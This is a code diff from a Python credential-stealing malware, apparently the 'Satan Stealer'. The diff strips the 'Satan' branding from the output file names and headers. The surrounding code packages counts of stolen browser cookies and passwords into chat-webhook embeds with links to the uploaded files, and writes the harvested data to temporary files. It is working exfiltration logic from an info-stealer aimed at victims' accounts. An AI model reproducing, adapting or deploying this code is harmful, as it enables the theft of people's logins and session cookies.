@@ -369,7 +369,7 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n `+` **{CookiCount}** Cookies Found\n`+` [SatanCookies.txt]({link})",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n `+` **{CookiCount}** Cookies Found\n`+` [Cookies.txt]({link})",
                     "color": 3026998,
                     "footer": {
                         "text": "☆.。.:*・°☆.。.:*・°☆.。.:*・°☆.。.:*・°☆",
@@ -392,7 +392,7 @@ def upload(name, link):
         data = {
             "embeds": [
                 {
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n`+` **{PasswCount}** Passwords Found\n`+` [SatanPasswords.txt]({link})",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n`+` **{PasswCount}** Passwords Found\n`+` [Passwords.txt]({link})",
                     "color": 3026998,
                     "footer": {
                         "text": "☆.。.:*・°☆.。.:*・°☆.。.:*・°☆.。.:*・°☆",
@@ -431,7 +431,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Satan STEALER ON TOP-->\n\n")
+        f.write(f"\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
